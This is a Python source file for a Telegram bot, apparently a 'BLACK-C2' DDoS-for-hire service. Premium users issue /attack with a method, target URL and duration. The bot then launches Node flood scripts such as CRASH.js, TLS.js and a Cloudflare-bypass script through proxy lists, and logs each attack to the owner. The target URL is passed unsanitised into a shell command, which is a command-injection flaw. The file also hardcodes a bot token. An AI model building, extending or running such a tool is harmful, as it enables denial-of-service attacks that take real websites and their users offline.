import telebot
import os
import subprocess
import time

# Initialize bot with your token
bot = telebot.TeleBot("7889155463:AAGc6c_cYwQ-BYBMUxqIhybqKOblwBqQwUg")

# File paths
PREMIUM_USERS_FILE = "premium_users.txt"
PROXY_FILE = "proxy.txt"
UA_FILE = "user-agents.txt"
ADMIN_USER = "Mysterious_50"  # Admin username
ADMIN_CHAT_ID = 7593930576  # Replace this with the actual chat ID of the admin
is_attack_running = False

# Attack methods
METHODS = ["BROWSER", "BYPASS", "RAPID", "CRASH", "HTTP", "BLACK", "KILL", "FUCK", "BOTNET", "TLS", "PSYCHO"]

# Load premium users from file
def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, 'r') as f:
        return set(line.strip() for line in f if line.strip())

# Save premium users to file
def save_premium_users(users):
    with open(PREMIUM_USERS_FILE, 'w') as f:
        f.write("\n".join(users))

# Load premium users at startup
premium_users = load_premium_users()

# Function to handle attack end
def end_attack(chat_id, url, duration):
    global is_attack_running
    time.sleep(duration)
    is_attack_running = False
    bot.send_message(chat_id, f"Attack has ended on {url}.")

# Loading animation
def send_loading_animation(chat_id):
    for i in range(1, 4):
        bot.send_message(chat_id, f"Loading {'.' * i}")
        time.sleep(1)

# Start command
@bot.message_handler(commands=['start'])
def start_message(message):
    chat_id = message.chat.id
    send_loading_animation(chat_id)
    time.sleep(3)
    bot.send_message(chat_id, """
>𝘽𝙇𝘼𝘾𝙆-𝘾𝟮 | 𝘽𝙇𝘼𝘾𝙆-𝘾𝟮
▬▭▬▭▬▭▬▭▬▭▬▭▬
Attack Command
- /attack
▬▭▬▭▬▭▬▭▬▭▬▭▬
Preparation Command
- /methods
- /updateproxy
- /proxycount
- /uacount
▬▭▬▭▬▭▬▭▬▭▬▭▬
Owner Command
- /addprem
- /delprem
▬▭▬▭▬▭▬▭▬▭▬▭▬
""")

# Methods command
@bot.message_handler(commands=['methods'])
def methods_command(message):
    bot.send_message(message.chat.id, """
>Available Methods:
▬▭▬▭▬▭▬▭▬▭▬▭▬
- CRASH
- TLS
- BROWSER
- RAPID 
- BLACK
- BYPASS
- HTTP
- KILL
- BOTNET
- FUCK
- PSYCHO
▬▭▬▭▬▭▬▭▬▭▬▭▬
    """)

# Attack command
@bot.message_handler(commands=['attack'])
def attack_command(message):
    global is_attack_running
    username = message.from_user.username
    chat_id = message.chat.id

    if username not in premium_users:
        bot.send_message(chat_id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only premium users can use the /attack command.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    if is_attack_running:
        bot.send_message(chat_id, """
>Attack In Progress
▬▭▬▭▬▭▬▭▬▭▬▭▬
An attack is already running. Please wait for it to finish.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    args = message.text.split(' ')
    if len(args) != 4:
        bot.send_message(chat_id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /attack <method> <url> <time>
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    method = args[1].upper()
    url = args[2]
    duration = int(args[3])

    if method not in METHODS:
        bot.send_message(chat_id, f"""
>Invalid Method
▬▭▬▭▬▭▬▭▬▭▬▭▬
Available methods: {', '.join(METHODS)}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    if duration > 300:
        bot.send_message(chat_id, """
>Duration Error
▬▭▬▭▬▭▬▭▬▭▬▭▬
The maximum allowed attack duration is 300 seconds.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    command = {
        "CRASH": f"node CRASH.js {url} {duration} 32 15000 proxy.txt",
        "TLS": f"node TLS.js {url} {duration} 128 20 proxy.txt",
        "BROWSER": f"node DRAGON.js {url} {duration} 32 15 proxy.txt",
        "RAPID": f"node RAPID.js {url} {duration} 126 15 proxy.txt",
        "BLACK": f"node KILL.js {url} {duration} 128 20 proxy.txt",
        "HTTP": f"node DarkBotnet.js {url} {duration} 132 15 proxy.txt",
        "BYPASS": f"node BYPASS.js {url} {duration} 126 15 proxy.txt",
  "KILL": f"node CF.js {url} {duration} 200 15000 proxy.txt",
  "FUCK": f"node KILLNET.js {url} {duration} 126 1500 proxy.txt",
  "BOTNET": f"node VIRUS.js {url} {duration} 126 1500 proxy.txt",
  "PSYCHO": f"node DarkBotnet.js {url} {duration} 126 1500 proxy.txt",
    }.get(method)

    is_attack_running = True
    bot.send_message(chat_id, "[❗]")

    # Execute command
    try:
        subprocess.Popen(command, shell=True)
        start_time = time.strftime('%Y-%m-%d %H:%M:%S')
        bot.send_message(chat_id, f"""
>Command Executed!
▬▭▬▭▬▭▬▭▬▭▬▭▬
Target: {url}
Duration: {duration} seconds
Method: {method}
*Start Time:* {start_time}
*Running Attacks:* 1/1
➖➖➖➖➖➖➖➖➖➖
*Owner : ( @{ADMIN_USER} )*
        """)

        # Notify admin
        bot.send_message(ADMIN_CHAT_ID, f"""
>Attack Log
User: @{username}
Target: {url}
Method: {method}
Duration: {duration} seconds
Start Time: {start_time}
        """)
        
        end_attack(chat_id, url, duration)

    except Exception as e:
        is_attack_running = False
        bot.send_message(chat_id, f"Error occurred:\n{str(e)}")

# Proxy count command
@bot.message_handler(commands=['proxycount'])
def proxy_count_command(message):
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            count = len(f.readlines())
        bot.send_message(message.chat.id, f"""
>Proxy Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
Proxy Count: {count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
    else:
        bot.send_message(message.chat.id, """
>Proxy File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The proxy file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# User-agent count command
@bot.message_handler(commands=['uacount'])
def ua_count_command(message):
    if os.path.exists(UA_FILE):
        with open(UA_FILE, 'r') as f:
            count = len(f.readlines())
        bot.send_message(message.chat.id, f"""
>User-Agent Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
User-Agent Count: {count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
    else:
        bot.send_message(message.chat.id, """
>User-Agent File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The user-agent file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Add premium user command
@bot.message_handler(commands=['addprem'])
def add_premium_user_command(message):
    username = message.from_user.username
    if username == ADMIN_USER:
        args = message.text.split(' ')
        if len(args) != 2:
            bot.send_message(message.chat.id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /addprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
            return
        user_to_add = args[1]
        premium_users.add(user_to_add)
        save_premium_users(premium_users)
        bot.send_message(message.chat.id, f"""
>Premium User Added
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_add} added to premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
       """)
    else:
        bot.send_message(message.chat.id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can add premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Remove premium user command
@bot.message_handler(commands=['delprem'])
def del_premium_user_command(message):
    username = message.from_user.username
    if username == ADMIN_USER:
        args = message.text.split(' ')
        if len(args) != 2:
            bot.send_message(message.chat.id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /delprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
            return

        user_to_remove = args[1]
        if user_to_remove in premium_users:
            premium_users.remove(user_to_remove)
            save_premium_users(premium_users)
            bot.send_message(message.chat.id, f"""
>Premium User Removed
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_remove} removed from premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
        else:
            bot.send_message(message.chat.id, f"""
>User Not Found
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_remove} is not a premium user.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
    else:
        bot.send_message(message.chat.id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can remove premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Start polling to listen to commands
bot.polling()